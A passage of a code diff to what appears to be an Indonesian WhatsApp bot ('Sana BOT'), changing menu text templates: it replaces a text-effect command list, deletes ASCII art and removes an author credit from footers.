-│➳ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
-│➳ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
-│➳ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
-│➳ ${prefix}𝚜𝚙𝚊𝚌𝚎
-│➳ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
-│➳ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
-│➳ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
-│➳ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
-│➳ ${prefix}𝚋𝚎𝚛𝚛𝚢
-│➳ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
-│➳ ${prefix}𝚖𝚊𝚐𝚖𝚊
-│➳ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
-│➳ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
-│➳ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
-│➳ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
-│➳ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
-│➳ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
-│➳ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
-│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➳ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
-│➳ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
-│➳ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
-│➳ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
-│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➳ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
-╰━═════════════━•
+╔═══════✪「 MAKER MENU 」	
+╠ ${prefix}candy
+╠ ${prefix}8bit
+╠ ${prefix}horror
+╠ ${prefix}hoorror
+╠ ${prefix}retro
+╠ ${prefix}blackpinkneon
+╠ ${prefix}deepsea
+╠ ${prefix}scifi
+╠ ${prefix}fiction
+╠ ${prefix}berry
+╠ ${prefix}fruitjuice
+╠ ${prefix}biscuit
+╠ ${prefix}wood
+╠ ${prefix}chocolate
+╠ ${prefix}matrix
+╠ ${prefix}blood
+╠ ${prefix}halloween
+╠ ${prefix}wicker
+╠ ${prefix}darkgold
+╠ ${prefix}firework
+╠ ${prefix}skeleton
+╠ ${prefix}sand
+╠ ${prefix}glue
+╠ ${prefix}leaves
+╠ ${prefix}magma
+╠ ${prefix}lava
+╠ ${prefix}rock
+╠ ${prefix}bloodglas
+╠ ${prefix}underwater
+╠ ${prefix}textmaker
+╠ ${prefix}honey
+╠ ${prefix}ice
+╠ ${prefix}watercolor
+╠ ${prefix}multicolor
+╠ ${prefix}snow
+╠ ${prefix}harrypot
+╠ ${prefix}harrypotter
+╠ ${prefix}brokenglass
+╠ ${prefix}waterpipe
+╠ ${prefix}spooky
+╠ ${prefix}circuit
+╠ ${prefix}metallic
+╠ ${prefix}demon
+╠ ${prefix}sparklechristmas
+╠ ${prefix}christmas
+╠ ${prefix}3dchristmas
+╠ ${prefix}3dbox
+╠ ${prefix}waterdrop
+╠ ${prefix}lion2
+╠ ${prefix}papercut
+╠ ${prefix}transformer
+╠ ${prefix}neondevil
+╠ ${prefix}3davengers
+╠ ${prefix}3dstone
+╠ ${prefix}3dstone2
+╠ ${prefix}summertime
+╠ ${prefix}thunder
+╠ ${prefix}window
+╠ ${prefix}graffiti
+╠ ${prefix}graffitibike
+╠ ${prefix}pornhub
+╠ ${prefix}glitch
+╠ ${prefix}blackpink
+╠ ${prefix}glitch2
+╠ ${prefix}glitch3
+╠ ${prefix}3dspace
+╠ ${prefix}lion
+╠ ${prefix}3dneon
+╠ ${prefix}greenneon
+╠ ${prefix}bokeh
+╠ ${prefix}holographic
+╠ ${prefix}bear
+╠ ${prefix}wolf
+╠ ${prefix}joker
+╠ ${prefix}dropwater
+╠ ${prefix}dropwater2
+╠ ${prefix}thewall
+╠ ${prefix}neonlight
+╠ ${prefix}natural
+╠ ${prefix}carbon
+╠ ${prefix}pencil
+╠ ${prefix}blackpink2
+╠ ${prefix}neon
+╠ ${prefix}neonlight2
+╠ ${prefix}toxic
+╠ ${prefix}strawberry
+╠ ${prefix}discovery
+╠ ${prefix}1917
+╠ ${prefix}sci_fi
+╠ ${prefix}ancient
+╠ ${prefix}fabric
+╠ ${prefix}hoorror
+╠ ${prefix}whitebear
+╠ ${prefix}juice
+╠ ${prefix}batman
+╠ ${prefix}multicolor
+╠ ${prefix}collwall
+╠ ${prefix}wonderful
+╠ ${prefix}cool
+╠ ${prefix}sketch
+╠ ${prefix}marvel
+╠ ${prefix}foggy
+╠ ${prefix}menulis
+╠ ${prefix}halloweenfire
+╠ ${prefix}halloween
+╠ ${prefix}watercolor
+╠ ${prefix}classic
+╚═════════════✪
 •━══❴ ㅊ ❈ Sana BOT ✯ KIKI ORIㅊ ❈ ❵══━• 
 ╭━═════════════━• 
 │〘PHOTO OXY MENU〙
@@ -3605,7 +3732,7 @@ need help?, bot report broken or not working?
 │➳ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
 │➳ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
 ╰━═════════════━•
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -3698,7 +3825,7 @@ need help?, bot report broken or not working?
 ✧ Thank you I hope you can understand it.
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -3741,11 +3868,6 @@ need help?, bot report broken or not working?
  case 'webzonemenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -3780,7 +3902,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -3823,11 +3945,6 @@ need help?, bot report broken or not working?
  case 'downloadmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -3869,7 +3986,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -3912,17 +4029,7 @@ need help?, bot report broken or not working?
  case 'searchmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -3959,7 +4066,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4002,11 +4109,6 @@ need help?, bot report broken or not working?
  case 'randommenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4050,7 +4152,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4093,11 +4195,7 @@ need help?, bot report broken or not working?
  case 'tekspromenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
+> 
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4120,42 +4218,118 @@ need help?, bot report broken or not working?
 ┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
 ╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
-╭━━•› 〘 TEKS PRO MENU 〙
-│➳ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
-│➳ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
-│➳ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
-│➳ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
-│➳ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
-│➳ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
-│➳ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
-│➳ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
-│➳ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
-│➳ ${prefix}𝚜𝚙𝚊𝚌𝚎
-│➳ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
-│➳ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
-│➳ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
-│➳ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
-│➳ ${prefix}𝚋𝚎𝚛𝚛𝚢
-│➳ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
-│➳ ${prefix}𝚖𝚊𝚐𝚖𝚊
-│➳ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
-│➳ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
-│➳ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
-│➳ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
-│➳ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
-│➳ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
-│➳ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
-│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➳ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
-│➳ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
-│➳ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
-│➳ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
-│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➳ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
-╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
+`╔═══════✪「 MAKER 」	
+╠ ${prefix}candy
+╠ ${prefix}8bit
+╠ ${prefix}horror
+╠ ${prefix}hoorror
+╠ ${prefix}retro
+╠ ${prefix}blackpinkneon
+╠ ${prefix}deepsea
+╠ ${prefix}scifi
+╠ ${prefix}fiction
+╠ ${prefix}berry
+╠ ${prefix}fruitjuice
+╠ ${prefix}biscuit
+╠ ${prefix}wood
+╠ ${prefix}chocolate
+╠ ${prefix}matrix
+╠ ${prefix}blood
+╠ ${prefix}halloween
+╠ ${prefix}wicker
+╠ ${prefix}darkgold
+╠ ${prefix}firework
+╠ ${prefix}skeleton
+╠ ${prefix}sand
+╠ ${prefix}glue
+╠ ${prefix}leaves
+╠ ${prefix}magma
+╠ ${prefix}lava
+╠ ${prefix}rock
+╠ ${prefix}bloodglas
+╠ ${prefix}underwater
+╠ ${prefix}textmaker
+╠ ${prefix}honey
+╠ ${prefix}ice
+╠ ${prefix}watercolor
+╠ ${prefix}multicolor
+╠ ${prefix}snow
+╠ ${prefix}harrypot
+╠ ${prefix}harrypotter
+╠ ${prefix}brokenglass
+╠ ${prefix}waterpipe
+╠ ${prefix}spooky
+╠ ${prefix}circuit
+╠ ${prefix}metallic
+╠ ${prefix}demon
+╠ ${prefix}sparklechristmas
+╠ ${prefix}christmas
+╠ ${prefix}3dchristmas
+╠ ${prefix}3dbox
+╠ ${prefix}waterdrop
+╠ ${prefix}lion2
+╠ ${prefix}papercut
+╠ ${prefix}transformer
+╠ ${prefix}neondevil
+╠ ${prefix}3davengers
+╠ ${prefix}3dstone
+╠ ${prefix}3dstone2
+╠ ${prefix}summertime
+╠ ${prefix}thunder
+╠ ${prefix}window
+╠ ${prefix}graffiti
+╠ ${prefix}graffitibike
+╠ ${prefix}pornhub
+╠ ${prefix}glitch
+╠ ${prefix}blackpink
+╠ ${prefix}glitch2
+╠ ${prefix}glitch3
+╠ ${prefix}3dspace
+╠ ${prefix}lion
+╠ ${prefix}3dneon
+╠ ${prefix}greenneon
+╠ ${prefix}bokeh
+╠ ${prefix}holographic
+╠ ${prefix}bear
+╠ ${prefix}wolf
+╠ ${prefix}joker
+╠ ${prefix}dropwater
+╠ ${prefix}dropwater2
+╠ ${prefix}thewall
+╠ ${prefix}neonlight
+╠ ${prefix}natural
+╠ ${prefix}carbon
+╠ ${prefix}pencil
+╠ ${prefix}blackpink2
+╠ ${prefix}neon
+╠ ${prefix}neonlight2
+╠ ${prefix}toxic
+╠ ${prefix}strawberry
+╠ ${prefix}discovery
+╠ ${prefix}1917
+╠ ${prefix}sci_fi
+╠ ${prefix}ancient
+╠ ${prefix}fabric
+╠ ${prefix}hoorror
+╠ ${prefix}whitebear
+╠ ${prefix}juice
+╠ ${prefix}batman
+╠ ${prefix}multicolor
+╠ ${prefix}collwall
+╠ ${prefix}wonderful
+╠ ${prefix}cool
+╠ ${prefix}sketch
+╠ ${prefix}marvel
+╠ ${prefix}foggy
+╠ ${prefix}menulis
+╠ ${prefix}halloweenfire
+╠ ${prefix}halloween
+╠ ${prefix}watercolor
+╠ ${prefix}classic
+╚═════════════✪
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4198,11 +4372,6 @@ need help?, bot report broken or not working?
  case 'ephotooxymenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4241,7 +4410,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4284,11 +4453,6 @@ need help?, bot report broken or not working?
  case 'ephotomenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4324,7 +4488,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4413,7 +4577,7 @@ need help?, bot report broken or not working?
 ✧ Thank you I hope you can understand it.
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4456,11 +4620,6 @@ need help?, bot report broken or not working?
  case 'primbonmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4517,7 +4676,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4560,11 +4719,6 @@ need help?, bot report broken or not working?
  case 'convertmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4608,7 +4762,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4651,11 +4805,6 @@ need help?, bot report broken or not working?
  case 'mainmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4692,7 +4841,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4735,11 +4884,6 @@ need help?, bot report broken or not working?
  case 'databasemenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4774,7 +4918,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4817,11 +4961,6 @@ need help?, bot report broken or not working?
  case 'anonymousmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4852,7 +4991,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4895,11 +5034,6 @@ need help?, bot report broken or not working?
  case 'islamicmenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -4931,7 +5065,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -4974,11 +5108,6 @@ need help?, bot report broken or not working?
  case 'voicemenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -5017,7 +5146,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
+© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵
 `
                 let btn = [{
                                 urlButton: {
@@ -5060,11 +5189,6 @@ need help?, bot report broken or not working?
  case 'ownermenu': {
  anu = `
 🎉 *Hai Kamu ${m.pushName} 
-░░░░░░░░░░█
-░░░░░░░░▄▄█▄▄
-░░░░▀▀▀██▀▀▀██▀▀▀
-▄▄▄▄▄▄▄███████▄▄▄▄▄▄▄
-░░█▄█░░▀██▄██▀░░█▄█
 > 🅢🅐🅝🅐 🅑🅞🅣 🅑🅨 🅚🅘🅚🅘 🅞🅡🅘
 •――――――― 〘 JAM INDONESIA 〙―――――――•
 ⏱️ *Waktu Indonesia Bagian Barat* : ${time}
@@ -5102,7 +5226,7 @@ need help?, bot report broken or not working?
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬ ▬▭ ✦✧✦ ▬▭▬ ▬▭
 
-© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵
